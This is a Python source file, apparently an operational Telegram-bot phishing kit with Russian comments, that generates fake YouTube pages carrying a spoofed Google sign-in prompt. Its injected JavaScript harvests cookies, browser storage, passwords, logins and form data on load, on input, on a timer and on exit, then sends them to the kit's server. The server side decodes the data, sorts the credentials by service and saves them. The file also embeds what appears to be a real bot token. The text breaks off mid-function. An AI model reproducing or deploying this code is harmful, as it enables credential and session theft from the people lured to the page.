import logging
import asyncio
import json
import re
import uuid
import html
import os
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
import base64
from urllib.parse import urlparse, parse_qs

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Добавляем Flask для веб-сервера
from flask import Flask, request, Response, jsonify, render_template_string
from threading import Thread
import requests

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"  # Замените на ваш токен
ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
DOMAIN = "http://localhost:8080"  # Локальный домен для тестирования
SERVER_PORT = 8080  # Порт сервера

# Хранилище данных
@dataclass
class PhishingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    active: bool = True
    collected_cookies: List[Dict] = None
    collected_passwords: List[Dict] = None
    collected_logins: List[Dict] = None
    collected_storage_data: List[Dict] = None  # localStorage/sessionStorage
    full_sensitive_data: List[Dict] = None     # Полные сырые данные
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []
        if self.collected_cookies is None:
            self.collected_cookies = []
        if self.collected_passwords is None:
            self.collected_passwords = []
        if self.collected_logins is None:
            self.collected_logins = []
        if self.collected_storage_data is None:
            self.collected_storage_data = []
        if self.full_sensitive_data is None:
            self.full_sensitive_data = []

class Database:
    def __init__(self):
        self.links: Dict[str, PhishingLink] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data_collected": 0,
            "active_sessions": 0,
            "cookies_collected": 0,
            "passwords_collected": 0,
            "logins_collected": 0,
            "storage_data_collected": 0,
            "full_data_collected": 0
        }
    
    def add_link(self, link: PhishingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[PhishingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.stats["total_data_collected"] += 1
            self.save()
    
    def add_collected_cookies(self, link_id: str, cookies: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_cookies.extend(cookies)
            self.stats["cookies_collected"] += len(cookies)
            self.save()
    
    def add_collected_passwords(self, link_id: str, passwords: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_passwords.extend(passwords)
            self.stats["passwords_collected"] += len(passwords)
            self.save()
    
    def add_collected_logins(self, link_id: str, logins: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_logins.extend(logins)
            self.stats["logins_collected"] += len(logins)
            self.save()
    
    def add_collected_storage(self, link_id: str, storage_data: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_storage_data.extend(storage_data)
            self.stats["storage_data_collected"] += len(storage_data)
            self.save()
    
    def add_full_sensitive_data(self, link_id: str, sensitive_data: Dict):
        if link_id in self.links:
            self.links[link_id].full_sensitive_data.append(sensitive_data)
            self.stats["full_data_collected"] += 1
            self.save()
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading database: {e}")

# Инициализация базы данных
db = Database()
db.load()

# Класс для определения принадлежности учетных записей к сервисам
class AccountIdentifier:
    """Класс для определения принадлежности учетных записей к сервисам"""
    
    SERVICE_PATTERNS = {
        "google": {
            "email_patterns": ["@gmail.com", "@googlemail.com"],
            "login_patterns": ["google", "gmail", "goog"],
            "cookie_patterns": ["google", "accounts.google", "gstatic", "youtube"],
            "form_patterns": ["google", "gmail"]
        },
        "facebook": {
            "email_patterns": ["@facebook.com"],
            "login_patterns": ["fb_", "facebook", "fb.com"],
            "cookie_patterns": ["facebook", "fb.com", "fbcdn"],
            "form_patterns": ["facebook", "fb_login"]
        },
        "twitter": {
            "email_patterns": [],
            "login_patterns": ["twitter", "x.com", "t.co"],
            "cookie_patterns": ["twitter", "x.com", "twimg"],
            "form_patterns": ["twitter", "x_login"]
        },
        "instagram": {
            "email_patterns": [],
            "login_patterns": ["instagram", "ig_", "insta"],
            "cookie_patterns": ["instagram", "cdninstagram"],
            "form_patterns": ["instagram"]
        },
        "vk": {
            "email_patterns": ["@vk.com", "@vkontakte.ru"],
            "login_patterns": ["vk_", "vkontakte", "vk.com"],
            "cookie_patterns": ["vk", "vkontakte", "userapi"],
            "form_patterns": ["vk", "vkontakte"]
        },
        "whatsapp": {
            "email_patterns": [],
            "login_patterns": ["whatsapp", "wa_"],
            "cookie_patterns": ["whatsapp"],
            "form_patterns": ["whatsapp"]
        },
        "telegram": {
            "email_patterns": [],
            "login_patterns": ["telegram", "tg_"],
            "cookie_patterns": ["telegram", "t.me"],
            "form_patterns": ["telegram"]
        },
        "yandex": {
            "email_patterns": ["@yandex.ru", "@ya.ru", "@yandex.com", "@yandex.ua", "@yandex.kz", "@yandex.by"],
            "login_patterns": ["yandex", "ya_", "yandexid"],
            "cookie_patterns": ["yandex", "yastatic"],
            "form_patterns": ["yandex"]
        },
        "mailru": {
            "email_patterns": ["@mail.ru", "@inbox.ru", "@list.ru", "@bk.ru"],
            "login_patterns": ["mail", "mailru", "my.mail"],
            "cookie_patterns": ["mail", "mail.ru"],
            "form_patterns": ["mail", "mailru"]
        },
        "github": {
            "email_patterns": [],
            "login_patterns": ["github", "gh_"],
            "cookie_patterns": ["github"],
            "form_patterns": ["github"]
        },
        "microsoft": {
            "email_patterns": ["@outlook.com", "@hotmail.com", "@live.com", "@microsoft.com"],
            "login_patterns": ["microsoft", "msft_", "outlook", "hotmail"],
            "cookie_patterns": ["microsoft", "live.com", "outlook"],
            "form_patterns": ["microsoft", "live"]
        }
    }
    
    SERVICE_NAMES_RU = {
        "google": "Google/Gmail",
        "facebook": "Facebook",
        "twitter": "Twitter/X",
        "instagram": "Instagram",
        "vk": "ВКонтакте",
        "whatsapp": "WhatsApp",
        "telegram": "Telegram",
        "yandex": "Яндекс",
        "mailru": "Mail.ru",
        "github": "GitHub",
        "microsoft": "Microsoft/Outlook"
    }
    
    @staticmethod
    def identify_account(value: str, source_data: Dict = None) -> List[str]:
        """Определяет к какому сервису принадлежит учетная запись"""
        identified_services = []
        
        if not value:
            return identified_services
        
        value_lower = value.lower()
        
        for service, patterns in AccountIdentifier.SERVICE_PATTERNS.items():
            if any(pattern in value_lower for pattern in patterns["email_patterns"]):
                if service not in identified_services:
                    identified_services.append(service)
                continue
            
            if any(pattern in value_lower for pattern in patterns["login_patterns"]):
                if service not in identified_services:
                    identified_services.append(service)
                continue
            
            if source_data and "cookies" in source_data:
                cookies_str = str(source_data.get("cookies", {})).lower()
                if any(pattern in cookies_str for pattern in patterns["cookie_patterns"]):
                    if service not in identified_services:
                        identified_services.append(service)
                    continue
        
        if "@" in value_lower:
            email_domain = value_lower.split("@")[1]
            
            domain_service_map = {
                "gmail.com": "google",
                "googlemail.com": "google",
                "yandex.ru": "yandex",
                "ya.ru": "yandex",
                "yandex.com": "yandex",
                "yandex.ua": "yandex",
                "yandex.kz": "yandex",
                "yandex.by": "yandex",
                "mail.ru": "mailru",
                "inbox.ru": "mailru",
                "list.ru": "mailru",
                "bk.ru": "mailru",
                "outlook.com": "microsoft",
                "hotmail.com": "microsoft",
                "live.com": "microsoft",
                "microsoft.com": "microsoft",
                "facebook.com": "facebook",
                "vk.com": "vk",
                "vkontakte.ru": "vk"
            }
            
            if email_domain in domain_service_map:
                service = domain_service_map[email_domain]
                if service not in identified_services:
                    identified_services.append(service)
        
        return identified_services
    
    @staticmethod
    def identify_accounts_from_data(collected_data: List[Dict]) -> Dict:
        """Определяет сервисы из всех собранных данных"""
        service_results = {
            "identified_accounts": [],
            "service_stats": {},
            "credentials_by_service": {}
        }
        
        for data_item in collected_data:
            if "value" in data_item and data_item["value"]:
                services = AccountIdentifier.identify_account(data_item["value"], data_item)
                if services:
                    data_item["identified_services"] = services
                    service_results["identified_accounts"].append({
                        "value": data_item["value"],
                        "services": services,
                        "type": data_item.get("field_name", "unknown"),
                        "source": data_item.get("source", "unknown")
                    })
                    
                    for service in services:
                        if service not in service_results["service_stats"]:
                            service_results["service_stats"][service] = 0
                        service_results["service_stats"][service] += 1
                        
                        if service not in service_results["credentials_by_service"]:
                            service_results["credentials_by_service"][service] = []
                        service_results["credentials_by_service"][service].append({
                            "value": data_item["value"][:50] + ("..." if len(data_item["value"]) > 50 else ""),
                            "type": data_item.get("field_name", "unknown"),
                            "source": data_item.get("source", "unknown"),
                            "timestamp": data_item.get("timestamp", "")
                        })
        
        return service_results

# Генератор JavaScript для сбора данных
class JavaScriptInjector:
    @staticmethod
    def get_cookies_collection_script() -> str:
        """JavaScript для сбора cookies"""
        return """
        <script>
        // Функция для сбора всех cookies
        function collectAllCookies() {
            const cookies = {};
            const cookieString = document.cookie;
            if (cookieString) {
                cookieString.split(';').forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value) {
                        cookies[name] = decodeURIComponent(value);
                    }
                });
            }
            
            try {
                const importantDomains = [
                    'google.com', 'facebook.com', 'twitter.com', 
                    'instagram.com', 'vk.com', 'youtube.com',
                    'whatsapp.com', 'telegram.org', 'github.com',
                    'microsoft.com', 'apple.com', 'amazon.com'
                ];
                
                importantDomains.forEach(domain => {
                    try {
                        if (window.localStorage) {
                            const lsData = {};
                            for (let i = 0; i < localStorage.length; i++) {
                                const key = localStorage.key(i);
                                lsData[key] = localStorage.getItem(key);
                            }
                            cookies['localStorage_' + domain] = JSON.stringify(lsData);
                        }
                        
                        if (window.sessionStorage) {
                            const ssData = {};
                            for (let i = 0; i < sessionStorage.length; i++) {
                                const key = sessionStorage.key(i);
                                ssData[key] = sessionStorage.getItem(key);
                            }
                            cookies['sessionStorage_' + domain] = JSON.stringify(ssData);
                        }
                    } catch (e) {}
                });
            } catch (e) {
                console.error('Error collecting advanced cookies:', e);
            }
            
            return cookies;
        }
        
        // Функция для сбора сохраненных паролей и логинов
        function collectSavedCredentials() {
            const credentials = {
                passwords: [],
                logins: [],
                autofill_data: []
            };
            
            try {
                const passwordFields = document.querySelectorAll('input[type="password"]');
                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]');
                
                passwordFields.forEach(field => {
                    if (field.value) {
                        credentials.passwords.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                loginFields.forEach(field => {
                    if (field.value && (field.type === 'text' || field.type === 'email' || field.type === 'tel')) {
                        credentials.logins.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                document.querySelectorAll('form').forEach(form => {
                    try {
                        const formData = new FormData(form);
                        const formValues = {};
                        for (let [key, value] of formData.entries()) {
                            formValues[key] = value;
                        }
                        
                        if (Object.keys(formValues).length > 0) {
                            credentials.autofill_data.push({
                                type: 'form_data',
                                form_id: form.id || 'unknown',
                                form_action: form.action || 'unknown',
                                data: formValues
                            });
                        }
                    } catch (e) {}
                });
                
            } catch (e) {
                console.error('Error collecting credentials:', e);
            }
            
            return credentials;
        }
        
        // Главная функция сбора всех данных
        async function collectAllSensitiveData() {
            const allData = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies: {},
                credentials: {},
                storage_data: {},
                browser_info: {
                    cookie_enabled: navigator.cookieEnabled,
                    do_not_track: navigator.doNotTrack || 'unspecified'
                }
            };
            
            try {
                allData.cookies = collectAllCookies();
                allData.credentials = collectSavedCredentials();
                
                allData.storage_data = {
                    localStorage: {},
                    sessionStorage: {}
                };
                
                if (window.localStorage) {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        allData.storage_data.localStorage[key] = localStorage.getItem(key);
                    }
                }
                
                if (window.sessionStorage) {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        allData.storage_data.sessionStorage[key] = sessionStorage.getItem(key);
                    }
                }
                
                allData.screen_info = {
                    width: window.screen.width,
                    height: window.screen.height,
                    color_depth: window.screen.colorDepth,
                    pixel_depth: window.screen.pixelDepth
                };
                
                allData.timezone = {
                    offset: new Date().getTimezoneOffset(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                
                return allData;
                
            } catch (error) {
                console.error('Error collecting sensitive data:', error);
                return {
                    error: error.message,
                    partial_data: allData
                };
            }
        }
        
        // Функция отправки данных на сервер
        function sendCollectedData(data) {
            const linkId = new URLSearchParams(window.location.search).get('id');
            if (!linkId) return;
            
            try {
                const jsonData = JSON.stringify(data);
                const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: 'sensitive_data',
                        data: encodedData,
                        timestamp: new Date().toISOString()
                    })
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Data sent successfully:', result);
                })
                .catch(error => {
                    console.error('Error sending data:', error);
                });
            } catch (error) {
                console.error('Error preparing data for send:', error);
            }
        }
        
        // Автоматический сбор данных при загрузке страницы
        window.addEventListener('load', function() {
            setTimeout(async () => {
                try {
                    const sensitiveData = await collectAllSensitiveData();
                    sendCollectedData(sensitiveData);
                } catch (e) {
                    console.error('Initial collection failed:', e);
                }
                
                document.addEventListener('submit', async function(e) {
                    setTimeout(async () => {
                        try {
                            const formData = await collectAllSensitiveData();
                            sendCollectedData(formData);
                        } catch (e) {
                            console.error('Form submit collection failed:', e);
                        }
                    }, 500);
                });
                
                document.querySelectorAll('input, textarea, select').forEach(input => {
                    input.addEventListener('change', async function() {
                        setTimeout(async () => {
                            try {
                                const fieldData = await collectAllSensitiveData();
                                sendCollectedData(fieldData);
                            } catch (e) {
                                console.error('Field change collection failed:', e);
                            }
                        }, 1000);
                    });
                    
                    input.addEventListener('blur', async function() {
                        setTimeout(async () => {
                            try {
                                const fieldData = await collectAllSensitiveData();
                                sendCollectedData(fieldData);
                            } catch (e) {
                                console.error('Field blur collection failed:', e);
                            }
                        }, 500);
                    });
                });
                
                setInterval(async () => {
                    try {
                        const periodicData = await collectAllSensitiveData();
                        sendCollectedData(periodicData);
                    } catch (e) {
                        console.error('Periodic collection failed:', e);
                    }
                }, 10000);
                
            }, 3000);
        });
        
        window.addEventListener('beforeunload', async function() {
            try {
                const exitData = await collectAllSensitiveData();
                const linkId = new URLSearchParams(window.location.search).get('id');
                if (linkId) {
                    const jsonData = JSON.stringify(exitData);
                    const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                    const blob = new Blob([JSON.stringify({
                        link_id: linkId,
                        data_type: 'sensitive_data',
                        data: encodedData,
                        timestamp: new Date().toISOString(),
                        exit_event: true
                    })], {type: 'application/json'});
                    
                    navigator.sendBeacon('/api/collect', blob);
                }
            } catch (e) {
                console.error('Exit collection failed:', e);
            }
        });
        </script>
        """
    
    @staticmethod
    def get_instant_credential_collection_script() -> str:
        """JavaScript для мгновенного сбора учетных данных при загрузке"""
        return """
        <script>
        function forceCollectAllCredentials() {
            const credentials = {
                instant_passwords: [],
                instant_logins: [],
                instant_forms: [],
                instant_autofill: []
            };
            
            try {
                document.querySelectorAll('input[type="password"]').forEach(field => {
                    if (field.value && field.value.trim() !== '') {
                        credentials.instant_passwords.push({
                            source: 'auto_detected',
                            field_name: field.name || field.id || field.placeholder || 'password_field',
                            field_id: field.id,
                            field_type: field.type,
                            field_class: field.className,
                            value: field.value,
                            form_id: field.form ? field.form.id : 'no_form',
                            page_url: window.location.href,
                            timestamp: new Date().toISOString(),
                            collected_on: 'page_load'
                        });
                    }
                });
                
                const loginSelectors = [
                    'input[type="text"]',
                    'input[type="email"]', 
                    'input[type="tel"]',
                    'input[name*="login"]',
                    'input[name*="user"]',
                    'input[name*="email"]',
                    'input[name*="username"]',
                    'input[autocomplete*="username"]',
                    'input[autocomplete*="email"]'
                ];
                
                loginSelectors.forEach(selector => {
                    document.querySelectorAll(selector).forEach(field => {
                        if (field.value && field.value.trim() !== '') {
                            credentials.instant_logins.push({
                                source: 'auto_detected',
                                field_name: field.name || field.id || field.placeholder || 'login_field',
                                field_id: field.id,
                                field_type: field.type,
                                field_class: field.className,
                                value: field.value,
                                form_id: field.form ? field.form.id : 'no_form',
                                page_url: window.location.href,
                                timestamp: new Date().toISOString(),
                                collected_on: 'page_load'
                            });
                        }
                    });
                });
                
                document.querySelectorAll('form').forEach(form => {
                    try {
                        const formData = {};
                        form.querySelectorAll('input, textarea, select').forEach(input => {
                            if (input.name && (input.value || input.value === 0 || input.value === false)) {
                                formData[input.name] = input.value;
                            }
                        });
                        
                        if (Object.keys(formData).length > 0) {
                            credentials.instant_forms.push({
                                form_id: form.id || 'anonymous_form',
                                form_action: form.action || 'unknown',
                                form_method: form.method || 'get',
                                data: formData,
                                timestamp: new Date().toISOString()
                            });
                        }
                    } catch (e) {}
                });
                
                setTimeout(() => {
                    try {
                        document.querySelectorAll('input[type="password"]').forEach(field => {
                            if (field.value && field.value.trim() !== '' && 
                                !credentials.instant_passwords.some(p => p.field_id === field.id)) {
                                credentials.instant_passwords.push({
                                    source: 'autofill_detected',
                                    field_name: field.name || field.id || 'password_field',
                                    field_id: field.id,
                                    value: field.value,
                                    timestamp: new Date().toISOString()
                                });
                            }
                        });
                    } catch (e) {}
                }, 1000);
                
            } catch (error) {
                console.error('Error in force credential collection:', error);
            }
            
            return credentials;
        }
        
        function sendInstantCredentials() {
            const linkId = new URLSearchParams(window.location.search).get('id');
            if (!linkId) return;
            
            try {
                const instantData = forceCollectAllCredentials();
                
                const allData = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    instant_collection: instantData,
                    user_agent: navigator.userAgent,
                    collected_on_load: true
                };
                
                fetch('/api/collect_instant', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: 'instant_credentials',
                        data: btoa(unescape(encodeURIComponent(JSON.stringify(allData)))),
                        timestamp: new Date().toISOString()
                    }),
                    keepalive: true
                }).catch(error => {
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', '/api/collect_instant', false);
                        xhr.send(JSON.stringify({
                            link_id: linkId,
                            data_type: 'instant_credentials',
                            data: btoa(unescape(encodeURIComponent(JSON.stringify(allData))))
                        }));
                    } catch (e) {}
                });
                
            } catch (error) {
                console.error('Error sending instant credentials:', error);
            }
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            sendInstantCredentials();
            setTimeout(sendInstantCredentials, 1000);
            setTimeout(sendInstantCredentials, 3000);
        });
        
        window.addEventListener('load', function() {
            setTimeout(sendInstantCredentials, 500);
            setTimeout(sendInstantCredentials, 2000);
        });
        
        document.addEventListener('click', function() {
            setTimeout(sendInstantCredentials, 300);
        }, true);
        
        document.addEventListener('focusin', function() {
            setTimeout(sendInstantCredentials, 400);
        }, true);
        </script>
        """
    
    @staticmethod
    def get_phishing_page_html(video_id: str, link_id: str) -> str:
        """Генерация HTML фишинговой страницы"""
        base_html = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>YouTube Video Player</title>
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                    background: #000;
                    font-family: Arial, sans-serif;
                }}
                .container {{
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                }}
                .player-container {{
                    position: relative;
                    padding-bottom: 56.25%;
                    height: 0;
                    overflow: hidden;
                }}
                .player-container iframe {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                }}
                .loading {{
                    text-align: center;
                    color: #fff;
                    padding: 50px;
                    font-size: 18px;
                }}
                .ad-banner {{
                    background: #ff0000;
                    color: white;
                    text-align: center;
                    padding: 10px;
                    margin: 20px 0;
                    border-radius: 5px;
                }}
                .login-prompt {{
                    background: #4285f4;
                    color: white;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 5px;
                    text-align: center;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="ad-banner">
                    🎬 Для просмотра видео требуется авторизация через Google
                </div>
                
                <div class="player-container">
                    <iframe 
                        src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=0&showinfo=0&rel=0" 
                        frameborder="0" 
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                        allowfullscreen>
                    </iframe>
                </div>
                
                <div class="login-prompt" id="loginPrompt">
                    <h3>⚠️ Требуется вход в аккаунт</h3>
                    <p>Для продолжения просмотра войдите в свой аккаунт Google</p>
                    <button onclick="showLoginForm()" style="
                        background: white;
                        color: #4285f4;
                        border: none;
                        padding: 10px 20px;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 16px;
                        margin: 10px;
                    ">
                        Войти в аккаунт
                    </button>
                </div>
                
                <div id="loginForm" style="display: none;">
                    <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3 style="color: #333;">Вход в Google</h3>
                        <form id="googleLoginForm">
                            <input type="email" 
                                   placeholder="Электронная почта или телефон" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <input type="password" 
                                   placeholder="Введите пароль" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <button type="submit" 
                                    style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer;">
                                Далее
                            </button>
                        </form>
                        <p style="color: #666; font-size: 12px; margin-top: 10px;">
                            Нажимая кнопку "Далее", вы соглашаетесь с Условиями использования и Политикой конфиденциальности Google.
                        </p>
                    </div>
                </div>
                
                <div class="loading" id="loading">
                    Загрузка видео... Пожалуйста, подождите
                </div>
            </div>
            
            <script>
                function showLoginForm() {{
                    document.getElementById('loginPrompt').style.display = 'none';
                    document.getElementById('loginForm').style.display = 'block';
                    document.getElementById('loading').innerHTML = 'Проверка учетных данных...';
                    
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Загрузка видео...';
                        setTimeout(function() {{
                            document.getElementById('loading').style.display = 'none';
                        }}, 2000);
                    }}, 1500);
                }}
                
                document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
                    e.preventDefault();
                    document.getElementById('loading').innerHTML = '🔐 Проверка безопасности...';
                    
                    const email = this.querySelector('input[type="email"]').value;
                    const password = this.querySelector('input[type="password"]').value;
                    
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Перенаправление...';
                    }}, 2000);
                }});
                
                setTimeout(function() {{
                    showLoginForm();
                }}, 5000);
            </script>
            {JavaScriptInjector.get_cookies_collection_script()}
            {JavaScriptInjector.get_instant_credential_collection_script()}
        </body>
        </html>
        """
        return base_html

# Генератор ссылок
class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        """Извлечение ID видео из YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_link_id() -> str:
        """Генерация уникального ID для ссылки"""
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_phishing_url(video_id: str, link_id: str) -> str:
        """Создание фишинговой ссылки"""
        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"

# Сборщик данных
class DataCollector:
    def __init__(self):
        self.collection_scripts = {
            "sensitive_data": self._process_sensitive_data,
            "instant_credentials": self._process_instant_credentials
        }
    
    async def collect_all_data(self, request_data: Dict) -> Dict:
        """Сбор всех возможных данных"""
        collected = {
            "timestamp": datetime.now().isoformat(),
            "ip": request_data.get("ip", "unknown"),
            "user_agent": request_data.get("user_agent", "unknown"),
            "referer": request_data.get("referer", "unknown"),
            "data": {}
        }
        
        data_type = request_data.get("data_type", "sensitive_data")
        if data_type in self.collection_scripts:
            try:
                collected["data"][data_type] = await self.collection_scripts[data_type](request_data)
            except Exception as e:
                collected["data"][data_type] = {"error": str(e)}
        
        return collected
    
    async def _process_instant_credentials(self, request_data: Dict) -> Dict:
        """Обработка мгновенно собранных учетных данных"""
        try:
            encoded_data = request_data.get("data")
            link_id = request_data.get("link_id")
            
            if not encoded_data or not link_id:
                return {"status": "no_data"}
            
            try:
                json_string = base64.b64decode(encoded_data).decode('utf-8')
                instant_data = json.loads(json_string)
            except Exception as decode_error:
                logger.error(f"Decode error for instant credentials: {decode_error}")
                return {"status": "decode_error"}
            
            instant_passwords = instant_data.get("instant_collection", {}).get("instant_passwords", [])
            if instant_passwords:
                for pwd in instant_passwords:
                    services = AccountIdentifier.identify_account(pwd.get("value", ""), pwd)
                    pwd["identified_services"] = services
                db.add_collected_passwords(link_id, instant_passwords)
            
            instant_logins = instant_data.get("instant_collection", {}).get("instant_logins", [])
            if instant_logins:
                for login in instant_logins:
                    services = AccountIdentifier.identify_account(login.get("value", ""), login)
                    login["identified_services"] = services
                db.add_collected_logins(link_id, instant_logins)
            
            instant_forms = instant_data.get("instant_collection", {}).get("instant_forms", [])
            for form_data in instant_forms:
                if form_data.get("data"):
                    for key, value in form_data["data"].items():
                        if isinstance(value, str) and value.strip():
                            field_lower = key.lower()
                            is_password = any(pwd_word in field_lower for pwd_word in 
                                            ['pass', 'pwd', 'secret', 'key', 'token'])
                            is_login = any(login_word in field_lower for login_word in 
                                         ['user', 'login', 'email', 'phone', 'username'])
                            
                            if is_password:
                                services = AccountIdentifier.identify_account(value)
                                db.add_collected_passwords(link_id, [{
                                    "source": "instant_form_analysis",
                                    "field_name": key,
                                    "value": value,
                                    "form_id": form_data.get("form_id", "unknown"),
                                    "timestamp": form_data.get("timestamp", datetime.now().isoformat()),
                                    "auto_detected": True,
                                    "identified_services": services
                                }])
                            elif is_login:
                                services = AccountIdentifier.identify_account(value)
                                db.add_collected_logins(link_id, [{
                                    "source": "instant_form_analysis",
                                    "field_name": key,
                                    "value": value,
                                    "form_id": form_data.get("form_id", "unknown"),
                                    "timestamp": form_data.get("timestamp", datetime.now().isoformat()),
                                    "auto_detected": True,
                                    "identified_services": services
                                }])
            
            all_credentials = []
            all_credentials.extend(instant_passwords)
            all_credentials.extend(instant_logins)
            account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
            
            logger.info(f"Instant credentials collected for link {link_id}: "
                       f"{len(instant_passwords)} passwords, "
                       f"{len(instant_logins)} logins, "
                       f"identified services: {list(account_analysis.get('service_stats', {}).keys())}")
            
            return {
                "status": "instant_collection_success",
                "passwords_collected": len(instant_passwords),
                "logins_collected": len(instant_logins),
                "forms_collected": len(instant_forms),
                "account_analysis": account_analysis,
                "collected_on_load": True,
                "user_interaction_required": False
            }
            
        except Exception as e:
            logger.error(f"Error processing instant credentials: {e}", exc_info=True)
            return {"status": "error", "error": str(e)}
    
    async def _process_sensitive_data(self, request_data: Dict) -> Dict:
        """Обработка ВСЕХ чувствительных данных"""
        try:
            sensitive_data = request_data.get("data")
            link_id = request_data.get("link_id")
            
            if not sensitive_data or not link_id:
                return {"status": "no_data"}
            
            try:
                decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
            except Exception as decode_error:
                logger.error(f"Decode error: {decode_error}")
                try:
                    decoded_string = base64.b64decode(sensitive_data).decode('utf-8', errors='ignore')
                    decoded_data = json.loads(decoded_string)
                except:
                    return {"status": "decode_error"}
            
            db.add_full_sensitive_data(link_id, decoded_data)
            
            cookies = decoded_data.get("cookies", {})
            if cookies:
                cookies_list = []
                for name, value in cookies.items():
                    if isinstance(value, str) and (value.startswith('{') or value.startswith('[')):
                        try:
                            parsed_value = json.loads(value)
                            if isinstance(parsed_value, dict):
                                for storage_key, storage_value in parsed_value.items():
                                    db.add_collected_storage(link_id, [{
                                        "type": "cookie_storage",
                                        "source": name,
                                        "key": storage_key,
                                        "value": str(storage_value)[:500],
                                        "timestamp": datetime.now().isoformat()
                                    }])
                                continue
                        except:
                            pass
                    
                    cookies_list.append({
                        "name": name,
                        "value": str(value)[:500] if value else "",
                        "domain": "current",
                        "timestamp": datetime.now().isoformat(),
                        "source": "direct_cookie"
                    })
                
                if cookies_list:
                    db.add_collected_cookies(link_id, cookies_list)
            
            credentials = decoded_data.get("credentials", {})
            if credentials.get("passwords"):
                for pwd in credentials["passwords"]:
